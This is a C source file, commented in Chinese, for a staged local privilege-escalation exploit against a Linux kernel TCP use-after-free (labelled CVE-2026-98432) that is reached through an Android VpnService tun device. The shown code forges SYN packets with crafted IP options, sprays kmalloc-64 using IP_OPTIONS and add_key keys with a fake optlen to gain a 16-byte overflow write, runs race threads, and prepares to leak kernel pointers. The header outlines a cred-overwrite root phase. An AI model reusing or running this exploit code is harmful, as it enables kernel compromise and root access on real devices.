/*
 * CVE-2026-98432 — ireq_opt use-after-free (6.6.118 / f72a02f47f4b)
 *
 * 输入侧走 VpnService 的 tun：把伪造的 SYN 写进 tun，内核当成本地入站处理，
 * 于是无需 CAP_NET_RAW 也能把带 IP 选项的报文塞进 tcp_v4_save_options()。
 *
 * 漏洞点在握手完成时：请求 sock 的 ireq_opt 被直接交给子 socket，子 socket
 * 销毁时以裸 kfree() 释放；而 SYNACK 重传定时器那条路径在 inet_csk_route_req()
 * 里拿到同一个指针，直到 ip_build_and_send_pkt()/ip_options_build() 末尾才 memcpy。
 * 两次读之间对象被释放并复用 → 读到的 optlen 与 __data 来自别人的对象。
 *
 * 本文件按阶段推进，每阶段都能单独跑，失败不 panic（PANIC_ON_OOPS=y 的机器
 * 上尤其重要）：
 *   probe  —— 只验通道：发 SYN、收 SYNACK、确认选项原样回来
 *   race   —— 边喷淋边打竞态，命中只表现为 SYNACK 选项长度异常
 *   leak   —— 命中后回读选项区，判定复用并挑出内核 .text 指针候选
 *   root   —— 拿 base + cred 指针改写（**尚未实现**，Kotlin 侧默认拒绝）
 *
 * 用法：libsynopt.so --tun-fd 3 --target 10.7.7.1 --port 47777 [--phase race]
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <time.h>
#include <unistd.h>

#include "synopt_offsets.h"

/* add_key / keyctl：用来做可控 optlen 的喷淋（见下方 root 阶段）。 */
#ifndef __NR_add_key
#define __NR_add_key 217
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 219
#endif

#define KEY_SPEC_PROCESS_KEYRING (-2)

/* 假 optlen：写进喷淋对象 data[0] 的值，也就是第二次读到的 optlen。
 *
 * 第一次读发生在 skb_push 之前，用的是真实 optlen=40（决定头部预留 60 字节）；
 * 第二次读在 skb_push 之后，若槽位已被我们的对象占住，这里拿到 56，
 * memcpy 就多写 16 字节到 skb 里 —— 这就是写原语的来源。
 *
 * 注意：56 是**被读到的字段值**，不是分配大小。分配发生在更早的
 * tcp_conn_request，那时 optlen 还是包里的 40，所以对象稳稳落在 kmalloc-64。 */
#define WRITE_OPTLEN   56        /* 假 optlen：比第一次的 40 大 16，制造 16 字节溢出 */
/* 探测用的假 optlen：比 40 小，memcpy 不会写穿预留头部，安全可回读。 */
#define PROBE_OPTLEN   8
/* 喷淋对象必须和漏洞对象落在**同一个 kmalloc 桶**。
 *
 * 漏洞对象是 tcp_conn_request 里分配的（反汇编 +0x4ac）：
 *     add x0, x24, #0xc        ; size = optlen + 12
 *     bl  __kmalloc
 *     str x25, [x19, #224]     ; → sk->ireq_opt
 * optlen=40 → 52 字节 → **kmalloc-64**（不是 96！）。
 *
 * user_key_payload 的布局是 rcu_head(0x10) + datalen(0x10) + data[]，
 * 总大小 = 0x18 + datalen。要落进 kmalloc-64 就得 ≤64：
 *     datalen = 40 → 0x18 + 40 = 64  ✅
 * 这样 data[0] 正好落在对象 +0x18，和 ip_options_rcu.optlen 对齐；
 * data[8] 落在 +0x20，和 __data 对齐。 */
#define KEY_DATALEN    40        /* 0x18 + 40 = 64 → kmalloc-64 */
#define KEY_SPRAY_N    256

/* ------------------------------------------------------------------ 日志 */

static int g_verbose;

static void say(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fputc('\n', stderr);
    fflush(stderr);
}

#define FAIL(fmt, ...) do { say("FAIL: " fmt, ##__VA_ARGS__); } while (0)

/* ------------------------------------------------------------------ 参数 */

static int g_tun = -1;
static uint32_t g_dst;
/* 源地址必须落在 tun 子网内：SYNACK 要靠这个网段的路由回到 tun，
 * 否则内核会把回包发到真实网卡，我们读不到。README 里“源不在直连子网”
 * 那条是针对有 raw socket + 嗅探的攻击侧，tun 方案不适用。 */
/* 注意字节序：这个值直接按内存写进 IP 头，必须和 inet_addr() 的结果一致。
 * 0x0a070763 展开是 99.7.7.10（错的），10.7.7.99 是 0x6307070a。 */
static uint32_t g_src = 0x6307070a; /* 10.7.7.99 */
static uint16_t g_port = 47777;
/* 现在是「批」而不是「轮」：每批并行跑 RACE_BATCH 个四元组，
 * 等一次重传定时器（约 1.1 秒）。20 批约 22 秒，
 * 相当于原来串行 400 轮的工作量。 */
static int g_rounds = 20;
/* Kotlin 侧建好并绑到 VPN 网络的监听 fd；-1 表示没有，自己建。 */
static int g_listen_fd_in = -1;
/* 是否真的写内核；当前硬关闭，只在 --allow-write 且后续放开后才为 1。 */
static int g_allow_write;

/* ------------------------------------------------------- 收发与环形缓冲 */

struct synack {
    /* 对端的随机源端口 —— 也就是我们发 SYN 时用的 sport，用来匹配本轮。
     * 名字故意不叫 sport/dport：内核回的包里它是目的端口，容易搞反。 */
    uint16_t peer;
    uint32_t ack;
    uint32_t seq;
    uint8_t optlen;
    uint8_t opts[64];
};

#define RING 256
static struct synack g_ring[RING];
static volatile unsigned g_head, g_tail;
static pthread_mutex_t g_ring_lock = PTHREAD_MUTEX_INITIALIZER;
static volatile int g_running = 1;
static volatile unsigned long g_tx, g_rx, g_synack, g_hit, g_clear, g_none;
/* 诊断用：凡是能从 tun 读到的包都计进 raw_rx，不管匹配不匹配。
 * raw_rx=0 说明包根本没回到 tun（投递方向或路由有问题），
 * raw_rx>0 但 synack=0 说明回来了但被过滤掉了 —— 两种故障完全不同。 */
static volatile unsigned long g_raw_rx, g_icmp_rx;
static uint8_t g_raw_first[64];
static size_t g_raw_first_len;
static volatile unsigned g_raw_proto;

/* 诊断：把从 tun 读到的每个包按「版本/协议/端口/标志」记一行，最多 TRACE_N 条。
 *
 * 只记摘要不记正文。之前 synack=0 时完全看不出内核回了什么：可能是 RST
 * （说明没有监听匹配）、ICMP 差错，也可能什么都没回。有这张表就不用再猜。 */
#define TRACE_N 24
struct pkt_trace {
    uint8_t ver, proto, flags, optlen;
    uint16_t sport, dport;
    uint16_t iplen;
    uint32_t saddr, daddr;
    uint8_t icmp_type, icmp_code;   /* proto=1 时有效 */
    uint8_t icmp_ptr;               /* Parameter Problem 的指针字段 */
};
static struct pkt_trace g_trace[TRACE_N];
static volatile unsigned g_trace_n;
/* 回到我们源地址、但不是 SYNACK 的 TCP 包（RST 就是从这里看出来的）。 */
static volatile unsigned long g_tcp_other, g_rst_seen;
/* SYNACK 回来了但和我们这一轮的 sport/isn 对不上：说明收包是通的，
 * 只是匹配条件写错了（或回的包根本不是给这一轮的）。 */
static volatile unsigned long g_mismatch;
/* ICMP Parameter Problem 计数：内核拒收我们的 IP 选项时会发这个。 */
static volatile unsigned long g_icmp_param_prob, g_icmp_unreach;
/* 真正的 echo reply（type 0）。g_icmp_rx 把差错报文也算进去了，
 * 用它判断"带选项的包能不能通"会把 ICMP 报错误当成成功。 */
static volatile unsigned long g_icmp_echo_reply;
/* 回给我们源端口、但标志不是 SYN+ACK 的 TCP 包：RST 占绝大多数。
 * 有 RST 说明包进了 TCP 层、只是没有 socket 接住它 —— 和"包没进 TCP"
 * 是完全不同的两种故障，之前混在一起看不出来。 */
static volatile unsigned long g_rst_to_us, g_tcp_other_to_us;
/* 0 = 不带 IP 选项；纯 TCP 通道对照用。 */
static int g_optlen = 40;

/* 校验和要分两步：先把各段原样求和，最后统一取反一次。
 *
 * 反码运算里 ~x ≡ -x（模 0xFFFF），所以“先取反再当 init 传进去”算出来的
 * 是 ph_sum - tcp_sum，而不是 -(ph_sum + tcp_sum) —— 每个包都会被内核
 * 当成校验和错误静默丢弃。之前 synack=0 就是这个原因。 */
static uint32_t csum_raw(const void *data, size_t len) {
    const uint16_t *p = data;
    uint32_t s = 0;
    while (len > 1) { s += *p++; len -= 2; }
    if (len) s += *(const uint8_t *)p;
    return s;
}

static uint16_t csum_fold(uint32_t s) {
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return (uint16_t)~s;
}

static uint16_t csum(const void *data, size_t len) {
    return csum_fold(csum_raw(data, len));
}

/* 选项构造。
 *
 * 两种形态：
 *   OPT_KIND_RR  —— 40 字节 RR（len=39，pointer=4），第 3 字节起塞 4 字节标记；
 *   OPT_KIND_NOP —— 全 NOP 填充到指定长度，永远合法，用来做长度扫描。
 *
 * 之所以要有 NOP 变体：RR 带指针语义，内核在收包时会按指针写回地址，
 * 一旦指针/长度组合不被接受，整包在 ip_rcv_options 里就被丢了，而且
 * 丢得悄无声息（ICMP 参数错误还会被限速）。用 NOP 能先确认"带选项的
 * SYN 到底能不能通"，再决定要不要坚持 RR。 */
enum opt_kind { OPT_KIND_RR, OPT_KIND_NOP };
static enum opt_kind g_opt_kind = OPT_KIND_RR;

static void build_opts_kind(uint8_t *o, size_t len, uint32_t tag, enum opt_kind kind) {
    memset(o, 1, len);              /* 1 = NOP */
    if (kind == OPT_KIND_NOP || len < 7) return;
    /* RR 撑满 40 字节：len=39 + 末尾 NOP，第 3 字节起是 4 字节标记。
     *
     * 用满长度是有意的：内核收包时 __ip_options_compile 会把本机地址写进
     * RR 的第一个地址槽（反汇编 0xea0734：地址落在选项起点 +3 处），
     * 而回包时 ip_options_build 还会再写一次 __data[rr + optlen - 5]
     * （反汇编 0xea003c 一带）。optlen=39 时后者落在 __data[34..37]，
     * 离标记（__data[3..6]）很远；换成短 RR 就会正好压掉标记，
     * is_spray_tag 立刻失效。所以长度不能随便缩。
     *
     * 注意：收包时写地址槽这一步会覆盖标记，也就是说**回来**的 SYNACK
     * 里 opts[3..6] 可能是内核写进去的本机地址，不一定是我们的 tag。
     * 判命中时不要只认 tag，optlen 偏离 40 才是主判据。
     */
    o[0] = 7;                       /* RR */
    o[1] = (uint8_t)(len - 1);      /* 选项长度 */
    o[2] = 4;                       /* pointer：第一个空槽 */
    o[3] = (uint8_t)(tag >> 24);
    o[4] = (uint8_t)(tag >> 16);
    o[5] = (uint8_t)(tag >> 8);
    o[6] = (uint8_t)tag;
}

static void build_opts(uint8_t *o, uint32_t tag) {
    build_opts_kind(o, OPT_MAXLEN, tag, g_opt_kind);
}

static size_t build_pkt(uint8_t *buf, uint16_t sport, uint32_t seq, uint32_t ack, uint8_t flags) {
    uint8_t opts[OPT_MAXLEN];
    size_t optlen = (size_t)g_optlen;
    if (optlen > OPT_MAXLEN) optlen = OPT_MAXLEN;
    if (optlen) build_opts(opts, 0x52550000u | (seq & 0xffff));

    size_t ihl = 20 + optlen, total = ihl + 20;
    memset(buf, 0, total);
    buf[0] = (uint8_t)(0x40 | (ihl / 4));
    buf[1] = 0;
    *(uint16_t *)(buf + 2) = htons((uint16_t)total);
    *(uint16_t *)(buf + 4) = (uint16_t)(0x4000 + (seq & 0x3fff));
    buf[8] = 64;
    buf[9] = 6;
    *(uint32_t *)(buf + 12) = g_src;
    *(uint32_t *)(buf + 16) = g_dst;
    if (optlen) memcpy(buf + 20, opts, optlen);
    *(uint16_t *)(buf + 10) = csum(buf, 20 + optlen);

    uint8_t *tcp = buf + ihl;
    *(uint16_t *)(tcp + 0) = htons(sport);
    *(uint16_t *)(tcp + 2) = htons(g_port);
    *(uint32_t *)(tcp + 4) = htonl(seq);
    *(uint32_t *)(tcp + 8) = htonl(ack);
    tcp[12] = 5 << 4;
    tcp[13] = flags;
    *(uint16_t *)(tcp + 14) = htons(0xffff);
    uint8_t ph[12];
    memcpy(ph, &g_src, 4);
    memcpy(ph + 4, &g_dst, 4);
    ph[8] = 0;
    ph[9] = 6;
    *(uint16_t *)(ph + 10) = htons(20);
    /* 伪头与 TCP 段各求原和，加起来只取反一次。 */
    uint32_t sum = csum_raw(ph, 12) + csum_raw(tcp, 20);
    *(uint16_t *)(tcp + 16) = csum_fold(sum);
    return total;
}

static void tx(const uint8_t *pkt, size_t len) {
    if (write(g_tun, pkt, len) > 0) g_tx++;
}

static void push(const struct synack *s) {
    unsigned next = (g_head + 1) % RING;
    if (next == g_tail) return;
    g_ring[g_head] = *s;
    g_head = next;
}

static int pop(struct synack *out) {
    if (g_tail == g_head) return 0;
    *out = g_ring[g_tail];
    g_tail = (g_tail + 1) % RING;
    return 1;
}

static void *reader(void *arg) {
    (void)arg;
    static uint8_t buf[2048];
    while (g_running) {
        ssize_t n = read(g_tun, buf, sizeof(buf));
        if (n <= 0) {
            if (n < 0 && (errno == EAGAIN || errno == EINTR)) continue;
            if (n == 0) break;
            continue;
        }
        if (n < 20) continue;
        /* 任何从 tun 读到的包都先记账，便于区分“没回来”和“被过滤”。 */
        if (g_raw_rx == 0) {
            size_t k = (size_t)n < sizeof(g_raw_first) ? (size_t)n : sizeof(g_raw_first);
            memcpy(g_raw_first, buf, k);
            g_raw_first_len = k;
            g_raw_proto = buf[9];
        }
        g_raw_rx++;
        if ((buf[0] >> 4) == 4 && buf[9] == 1) {
            g_icmp_rx++;
            size_t cihl = (buf[0] & 0x0f) * 4;
            if ((size_t)n >= cihl + 2) {
                if (buf[cihl] == 12) g_icmp_param_prob++;
                else if (buf[cihl] == 3) g_icmp_unreach++;
                else if (buf[cihl] == 0) g_icmp_echo_reply++;
            }
        }
        size_t ihl = (buf[0] & 0x0f) * 4;
        /* 记账：把每个包按摘要记一行，synack=0 时靠它判断内核到底回了什么。 */
        if (g_trace_n < TRACE_N) {
            struct pkt_trace t;
            memset(&t, 0, sizeof(t));
            t.ver = (uint8_t)(buf[0] >> 4);
            t.proto = buf[9];
            t.iplen = (uint16_t)n;
            if (t.ver == 4) {
                t.saddr = *(uint32_t *)(buf + 12);
                t.daddr = *(uint32_t *)(buf + 16);
                if (buf[9] == 1 && (size_t)n >= ihl + 8) {
                    const uint8_t *ic = buf + ihl;
                    t.icmp_type = ic[0];
                    t.icmp_code = ic[1];
                    t.icmp_ptr = ic[4];
                }
            }
            if (t.ver == 4 && (size_t)n >= ihl + 20 && buf[9] == 6) {
                const uint8_t *tp = buf + ihl;
                t.sport = ntohs(*(uint16_t *)(tp + 0));
                t.dport = ntohs(*(uint16_t *)(tp + 2));
                t.flags = tp[13];
                t.optlen = (uint8_t)(ihl - 20);
            }
            g_trace[g_trace_n++] = t;
        }
        if ((buf[0] >> 4) != 4 || buf[9] != 6 || (size_t)n < ihl + 20) continue;
        if (*(uint32_t *)(buf + 16) != g_src) continue;
        const uint8_t *tcp = buf + ihl;
        uint16_t sport = ntohs(*(uint16_t *)(tcp + 0));
        uint16_t dport = ntohs(*(uint16_t *)(tcp + 2));
        uint8_t flags = tcp[13];
        g_tcp_other++;
        if (flags & 0x04) g_rst_seen++;
        if (dport >= 20000) {           /* 我们的随机源端口段 */
            g_tcp_other_to_us++;
            if (flags & 0x04) g_rst_to_us++;
        }
        /* 内核回的 SYNACK：源端口是监听端口 g_port，目的端口是我们随机选的
         * sport。之前查的是 dport == g_port，于是每个 SYNACK 都在这里被丢掉，
         * 表现就是 tx 涨而 synack 永远是 0。 */
        if (sport != g_port) continue;
        if ((flags & 0x12) != 0x12) continue; /* SYN+ACK */
        (void)dport;
        g_rx++;
        struct synack s;
        memset(&s, 0, sizeof(s));
        s.peer = dport;   /* SYNACK 的目的端口 = 我们的随机源端口 */
        s.seq = ntohl(*(uint32_t *)(tcp + 4));
        s.ack = ntohl(*(uint32_t *)(tcp + 8));
        size_t tcp_hdr = (tcp[12] >> 4) * 4;
        size_t optlen = ihl - 20;
        if (optlen > sizeof(s.opts)) optlen = sizeof(s.opts);
        s.optlen = (uint8_t)optlen;
        if (optlen) memcpy(s.opts, buf + 20, optlen);
        (void)tcp_hdr;
        pthread_mutex_lock(&g_ring_lock);
        push(&s);
        pthread_mutex_unlock(&g_ring_lock);
    }
    return NULL;
}

/* ------------------------------------------------------------ 喷射 */

/* 用 IP_OPTIONS 把 kmalloc-64 填成可控对象：每条选项前 4 字节是标记，
 * 选项整体照抄了 40 字节，所以复用发生后 SYNACK 会把我们的标记送回来。 */
#define SPRAY_SOCKS 192
static int g_spray[SPRAY_SOCKS];
static int g_spray_n;
static volatile int g_spray_run;
static pthread_t g_spray_thread;

/* 标记里的“代”：喷射线程每轮 +1，回读时能看出对象是哪一代的。 */
static volatile uint32_t g_spray_gen;

/* 喷淋对象长度必须和漏洞对象落在同一个 kmalloc 桶。
 *
 * 两条路径的分配公式不一样，这是最容易搞错的地方：
 *   · 漏洞对象（tcp_v4_save_options，反汇编 tcp_conn_request+0x4ac）
 *         size = optlen + 12
 *     SYN 带 40 字节选项 → 52 → **kmalloc-64**；
 *   · 喷淋对象（setsockopt(IP_OPTIONS) → ip_options_get，+0x50）
 *         size = 0x20 + align4(optlen)
 *     用 40 字节 → 0x20+40 = 72 → **kmalloc-96**，差一个桶，撞不上；
 *     用 24 字节 → 0x20+24 = 56 → kmalloc-64 ✅。
 *
 * 顺带解决命中判定：喷淋对象的 optlen 字段就是选项长度本身，
 * 用 24 而不是 40，回来的 SYNACK 长度一旦是 24 附近就说明槽位被占住了。 */
#define SPRAY_OPTLEN   24

static void spray_free(void) {
    for (int i = 0; i < g_spray_n; i++) close(g_spray[i]);
    g_spray_n = 0;
}

/* 原地改写：把每个 socket 的 IP_OPTIONS 先清掉再设回去。
 *
 * 这是整个喷淋能不能跟上的关键。原来每轮 close 掉全部 socket 再重建，
 * 一轮要 2×192 次系统调用（socket + setsockopt + close），实测量级是
 * 毫秒；而 UAF 窗口只有微秒，差了两三个数量级 —— 这也解释了为什么
 * clear 已经出现（撞上了指针被置空那种时序），hit 却始终是 0。
 *
 * 改成复用同一批 socket，只把选项清零再写回：
 *   setsockopt(IP_OPTIONS, NULL, 0) → 内核 kfree 掉旧的 ip_options_rcu
 *   setsockopt(IP_OPTIONS, opts, 24) → 立刻 kmalloc 一个新的
 * 每个 socket 只有两次 setsockopt，没有 socket()/close()，快一个数量级，
 * 而且「释放 → 重新分配」的间隔被压到最短，正是我们要的。 */
static void spray_recycle(uint32_t tag) {
    uint8_t opts[SPRAY_OPTLEN];
    memset(opts, 0, sizeof(opts));
    build_opts_kind(opts, SPRAY_OPTLEN, tag, OPT_KIND_NOP);

    if (g_spray_n == 0) {
        /* 第一次：建好这批 socket 并装上选项，之后就一直复用。 */
        for (int i = 0; i < SPRAY_SOCKS; i++) {
            int fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) break;
            if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, SPRAY_OPTLEN) < 0) {
                close(fd);
                continue;
            }
            g_spray[g_spray_n++] = fd;
        }
        return;
    }

    /* 只轮换一半，另一半始终占着槽位；两轮分开做（先全放、再全补）。
     *
     * 全部释放再全部重建的话，每轮都有一段「192 个槽位同时空着」的时间，
     * 而这正是我们最不想看到的 —— 内核那个 kfree 出来的洞如果落在这段
     * 空档里，虽然紧接着会被填上，但距离释放已经隔了半轮，定时器那边
     * 早读完了。留一半不动，kmalloc-64 里就始终有我们的对象，
     * 被腾出来的那一半又足够给新分配提供落点。 */
    int half = g_spray_n / 2;
    /* 每轮交替轮换哪一半，保证两半都被动过。
     * tag 的低 16 位是喷淋代数，用它的奇偶当开关。 */
    int start = (tag & 0xffff) & 1 ? half : 0;
    for (int i = start; i < start + half; i++) {
        setsockopt(g_spray[i], IPPROTO_IP, IP_OPTIONS, NULL, 0);
    }
    for (int i = start; i < start + half; i++) {
        setsockopt(g_spray[i], IPPROTO_IP, IP_OPTIONS, opts, SPRAY_OPTLEN);
    }
}

/* 竞态用的喷淋源。
 *
 * leak 阶段用 IP_OPTIONS：只能写 40 字节，覆盖不到 optlen（+0x18），
 * 所以只适合“确认槽位被复用”。
 * root 阶段用 add_key：datalen=40 时 0x18+40=64 落 kmalloc-64，且
 * data[0] 正好压在 optlen 上，能构造出“第二次读到大 optlen”的条件。 */
enum spray_kind { SPRAY_IPOPT, SPRAY_KEY };
static enum spray_kind g_spray_kind = SPRAY_IPOPT;
static uint8_t g_fake_optlen = 40;

/* ---- add_key 喷射 ----
 *
 * 每个 key 占一个 kmalloc-64 槽位。key 本身要留在 keyring 里，槽位才不被
 * 立刻释放，所以喷完不能马上 unlink —— 留到进程退出再说。 */
static int32_t g_keys[KEY_SPRAY_N];
static int g_key_n;

static int key_spray(uint8_t fake_optlen, uint32_t tag) {
    uint8_t payload[KEY_DATALEN];
    memset(payload, 0, sizeof(payload));
    payload[0] = fake_optlen;                 /* → ip_options_rcu.optlen */
    payload[1] = 0x01;                        /* srr：让 ip_options_build 走 RR 分支 */
    payload[2] = 0x01;                        /* rr  */
    /* __data 从 payload[8] 开始，对应 ip_options_rcu+0x20 */
    memcpy(payload + 8, &tag, 4);

    int made = 0;
    for (int i = 0; i < KEY_SPRAY_N && g_key_n < KEY_SPRAY_N; i++) {
        static unsigned seq;
        char desc[32];
        snprintf(desc, sizeof(desc), "synopt-%d-%u", (int)getpid(), seq++);
        long r = syscall(__NR_add_key, "user", desc, payload, (size_t)KEY_DATALEN,
                         KEY_SPEC_PROCESS_KEYRING);
        if (r < 0) {
            if (errno == ENOSYS || errno == EACCES || errno == EPERM) {
                say("[key] add_key 不可用（errno=%d），这条喷射路径走不通", errno);
                return -1;
            }
            continue;
        }
        g_keys[g_key_n++] = (int32_t)r;
        made++;
    }
    return made;
}

/* 只释放一半的 key，留一半继续占着槽位。
 *
 * 全放会制造「槽位全空」的瞬间，UAF 窗口正好落进去就白跑一轮；
 * 留一半能保证 kmalloc-64 里始终有我们的对象。 */
static void key_spray_release_half(void) {
    int half = g_key_n / 2;
    for (int i = 0; i < half; i++) {
        syscall(__NR_keyctl, 9 /* KEYCTL_UNLINK */, g_keys[i], KEY_SPEC_PROCESS_KEYRING);
    }
    /* 把剩下的挪到前面，腾出尾部空间给新对象。 */
    for (int i = half; i < g_key_n; i++) g_keys[i - half] = g_keys[i];
    g_key_n -= half;
}

static void key_spray_free(void) {
    /* KEYCTL_UNLINK = 9（不是 3；3 是 KEYCTL_READ）。参数：key, keyring */
    for (int i = 0; i < g_key_n; i++) {
        syscall(__NR_keyctl, 9 /* KEYCTL_UNLINK */, g_keys[i], KEY_SPEC_PROCESS_KEYRING);
    }
    g_key_n = 0;
}

/* 持续占位。
 *
 * 单发一次喷淋几乎不可能命中：被释放的槽位必须在 ip_build_and_send_pkt
 * 真正拷贝之前就被占住，中间只有微秒级窗口。所以竞态期间开一个线程不停
 * 地“关掉一批 → 重新分配一批”，让 kmalloc-64 一直有我们的对象进出。 */
static void *spray_worker(void *arg) {
    (void)arg;
    /* 这里本来想绑核，但 pthread_setaffinity_np 和 sched_setaffinity
     * 都要 _GNU_SOURCE 下的 cpu_set_t，Android NDK 在 CI 上不声明前者，
     * ISO C99 不允许隐式声明，直接编译失败，所以拿掉了。
     *
     * 不绑也能工作：跨核靠的是「重传定时器跑在软中断上下文」这个事实，
     * 和我们在哪个核上喷无关。喷淋线程纯用户态、几乎不让出 CPU，
     * 调度器自然会把它排到空闲核上。 */
    while (g_spray_run) {
        uint32_t gen = ++g_spray_gen;
        if (g_spray_kind == SPRAY_KEY) {
            /* 保持槽位始终被占住，不要整批清空。
             *
             * 原来每轮 key_spray_free() 把 256 个对象全放掉再重喷，中间有
             * 一段「槽位全空」的瞬间。UAF 的窗口是微秒级的，kfree 一旦落
             * 在那段空档里，虽然紧接着补喷的对象能占住槽位，但距离释放已经
             * 隔了一次完整循环，重传 SYN 的读路径根本等不到。
             *
             * 改成：先释放一半、立刻补满。任何时刻都有一半槽位被我们的
             * 对象占着，被释放的那个槽位也会在补喷时被新对象顶上。 */
            key_spray_release_half();
            key_spray(g_fake_optlen, 0x53570000u | (gen & 0xffff));
        } else {
            /* IP_OPTIONS 这条：复用同一批 socket，只改写选项。
             * 释放和重新分配之间只隔一次 setsockopt，间隔最短。 */
            spray_recycle(0x53500000u | (gen & 0xffff));
        }
        /* 不休眠：喷淋越快，落在 UAF 窗口里的概率越高。
         * 之前每轮 usleep(100) 是怕把 CPU 占满，但这条线程本来就是
         * 竞态的一部分，让它跑满才是对的。加一个极短的 sched_yield
         * 避免饿死同优先级的读包线程。 */
        sched_yield();
    }
    if (g_spray_kind == SPRAY_KEY) key_spray_free();
    else spray_free();
    return NULL;
}

static void spray_start(void) {
    if (g_spray_run) return;
    g_spray_run = 1;
    pthread_create(&g_spray_thread, NULL, spray_worker, NULL);
}

static void spray_stop(void) {
    if (!g_spray_run) return;
    g_spray_run = 0;
    pthread_join(g_spray_thread, NULL);
}

/* ------------------------------------------------------------ 通道自检
 *
 * 在打 TCP 之前先回答一个更基本的问题：往 tun 里写的包，内核到底收不收？
 *
 * 做法是发一个 ICMP echo request 到 tun 自己的地址。如果内核把包当成本地
 * 入站处理，它会直接回一个 echo reply —— 这条路径不牵扯监听套接字、不牵扯
 * TCP 校验和，是最干净的判据：
 *
 *   icmp reply 回来  → 投递方向是通的，问题在 TCP 层（端口/校验和/过滤）
 *   一个包都不回    → 包没有进入内核栈，问题在 VpnService 语义、路由或
 *                      rp_filter，再怎么调 TCP 参数都没用
 */
static size_t build_icmp_echo_ex(uint8_t *buf, size_t optlen) {
    if (optlen > OPT_MAXLEN) optlen = OPT_MAXLEN;
    const size_t ihl = 20 + optlen, icmp_len = 8 + 16;
    const size_t total = ihl + icmp_len;
    memset(buf, 0, total);

    buf[0] = (uint8_t)(0x40 | (ihl / 4));
    *(uint16_t *)(buf + 2) = htons((uint16_t)total);
    *(uint16_t *)(buf + 4) = htons(0x1234);
    buf[8] = 64;
    buf[9] = 1;                    /* ICMP */
    *(uint32_t *)(buf + 12) = g_src;
    *(uint32_t *)(buf + 16) = g_dst;
    if (optlen) memset(buf + 20, 1, optlen);   /* 全 NOP：最保守的合法选项 */
    *(uint16_t *)(buf + 10) = csum(buf, ihl);

    uint8_t *icmp = buf + ihl;
    icmp[0] = 8;                   /* echo request */
    icmp[1] = 0;
    *(uint16_t *)(icmp + 4) = htons(0x5a5a);   /* id */
    *(uint16_t *)(icmp + 6) = htons(0x0001);   /* seq */
    for (int i = 0; i < 16; i++) icmp[8 + i] = (uint8_t)('a' + i);
    *(uint16_t *)(icmp + 2) = csum(icmp, icmp_len);
    return total;
}

static size_t build_icmp_echo(uint8_t *buf) { return build_icmp_echo_ex(buf, 0); }

static int channel_selftest(void) {
    uint8_t pkt[192];
    size_t len = build_icmp_echo(pkt);
    unsigned long before = g_icmp_rx;
    say("[chan] 发送 ICMP echo → 10.7.7.1（测试包能否进入内核栈）");
    tx(pkt, len);

    for (int i = 0; i < 30 && g_icmp_rx == before; i++) usleep(10 * 1000);

    if (g_icmp_rx > before) {
        say("[OK] 收到 ICMP echo reply：tun 投递方向正常");
        return 0;
    }
    say("[!] ICMP 没有回包 —— 包没有进入内核栈");
    say("[!] raw_rx=%lu（从 tun 读到的包总数）", g_raw_rx);
    if (g_raw_first_len) {
        char line[200];
        int off = snprintf(line, sizeof(line), "[!] 首个包 proto=%u len=%zu:", g_raw_proto, g_raw_first_len);
        for (size_t i = 0; i < g_raw_first_len && i < 32; i++)
            off += snprintf(line + off, sizeof(line) - off, " %02x", g_raw_first[i]);
        say("%s", line);
    }
    say("[!] 可能原因：tun 没把 10.7.7.0/24 路由进来、rp_filter 丢弃了伪造源、");
    say("[!]           或 VpnService 未处于已建立状态");
    return 1;
}

/* /proc/net/snmp 差分：判定"内核到底有没有把我们的包算进去"。
 *
 * 只看四个数：
 *   Ip:InReceives  —— 进了 ip_rcv 的包数（没涨 = 包没进 IP 层）
 *   Ip:InHdrErrors —— 头错误（选项被拒就涨在这里）
 *   Tcp:InSegs     —— 进了 TCP 层的段数
 *   Tcp:InErrs / InCsumErrors —— 校验和错、格式错
 *
 * 读不到就返回 -1，调用方按"没有这个证据"处理，不影响主流程。
 */
#define SNMP_MAX 32
struct snmp_snap {
    unsigned long in_receives, in_hdr_errors;
    unsigned long tcp_in_segs, tcp_in_errs, tcp_csum_errs;
    int valid;
};

static int snmp_read(struct snmp_snap *out) {
    memset(out, 0, sizeof(*out));
    FILE *f = fopen("/proc/net/snmp", "r");
    if (f == NULL) return -1;
    char line[4096];
    int saw_ip = 0, saw_tcp = 0;
    while (fgets(line, sizeof(line), f) != NULL) {
        if (strncmp(line, "Ip: ", 4) == 0 && !saw_ip) {
            /* 第一行是表头，第二行才是数值 —— 用计数器保证只取数值行。 */
            saw_ip = 1;
            continue;
        }
        if (saw_ip == 1) {
            /* 这一行是 Ip 的数值行 */
            unsigned long v[SNMP_MAX];
            int n = 0;
            char *p2 = line + 4;
            while (n < SNMP_MAX && *p2) {
                v[n++] = strtoul(p2, &p2, 10);
                while (*p2 == ' ') p2++;
            }
            /* Ip 表头：Forwarding DefaultTTL InReceives InHdrErrors InAddrErrors ... */
            if (n > 3) { out->in_receives = v[2]; out->in_hdr_errors = v[3]; }
            saw_ip = 2;
            continue;
        }
        if (strncmp(line, "Tcp: ", 5) == 0 && saw_tcp == 0) {
            saw_tcp = 1;
            continue;
        }
        if (saw_tcp == 1) {
            unsigned long v[SNMP_MAX];
            int n = 0;
            char *p2 = line + 5;
            while (n < SNMP_MAX && *p2) {
                v[n++] = strtoul(p2, &p2, 10);
                while (*p2 == ' ') p2++;
            }
            /* Tcp 表头：RtoAlgorithm RtoMin RtoMax MaxConn ActiveOpens PassiveOpens
             * AttemptFails EstabResets CurrEstab InSegs OutSegs RetransSegs InErrs OutRsts InCsumErrors */
            if (n > 15) {
                out->tcp_in_segs = v[9];
                out->tcp_in_errs = v[12];
                out->tcp_csum_errs = v[15];
            }
            saw_tcp = 2;
            continue;
        }
    }
    fclose(f);
    out->valid = (saw_ip == 2 && saw_tcp == 2) ? 1 : 0;
    return out->valid ? 0 : -1;
}

